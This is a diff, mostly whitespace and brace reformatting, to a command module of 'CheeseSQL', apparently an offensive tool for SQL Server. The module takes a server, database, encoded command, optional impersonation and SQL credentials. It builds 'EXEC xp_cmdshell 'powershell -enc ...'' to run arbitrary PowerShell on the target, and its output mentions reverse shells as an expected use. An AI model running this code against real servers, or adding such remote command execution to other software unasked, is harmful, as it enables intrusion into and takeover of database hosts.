@@ -12,18 +12,23 @@ namespace CheeseSQL.Commands
         public string Description()
         {
             return $"[*] {CommandName}\r\n" +
-    $"  Description: Execute Encoded PowerShell Command via 'xp_cmdshell'";
+                   $"  Description: Execute Encoded PowerShell Command via 'xp_cmdshell'";
         }
 
         public string Usage()
         {
-            return $"{Description()}\r\n  " 
-                + $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} /db:DATABASE /server:SERVER /command:COMMAND [/impersonate:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
+            return $"{Description()}\r\n  " +
+                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
+                $"/db:DATABASE " +
+                $"/server:SERVER " +
+                $"/command:COMMAND " +
+                $"[/impersonate:USER] " +
+                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
         }
 
         public void Execute(Dictionary<string, string> arguments)
         {
- 
+
             string user = "";
             string password = "";
             string connectInfo = "";
@@ -71,7 +76,7 @@ namespace CheeseSQL.Commands
                 Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                 return;
             }
-            
+
             if (sqlauth)
             {
                 if (arguments.ContainsKey("/user"))
@@ -136,7 +141,8 @@ namespace CheeseSQL.Commands
                 Console.WriteLine("[*] Executing command..");
                 string execCmd = $"EXEC xp_cmdshell 'powershell -enc {cmd}';";
                 command = new SqlCommand(execCmd, connection);
-                using (reader = command.ExecuteReader()) {
+                using (reader = command.ExecuteReader())
+                {
                     try
                     {
                         reader.Read();
@@ -145,13 +151,15 @@ namespace CheeseSQL.Commands
                     catch { }
                 }
             }
-            catch (SqlException e) {
+            catch (SqlException e)
+            {
                 if (e.Message.Contains("Execution Timeout Expired"))
                 {
                     Console.WriteLine("[*] The SQL Query hit the timeout. If you were executing a reverse shell, this is expected");
                     brokenConnection = true;
                 }
-                else {
+                else
+                {
                     Console.WriteLine($"[-] Exception: {e.Message}");
                     return;
                 }
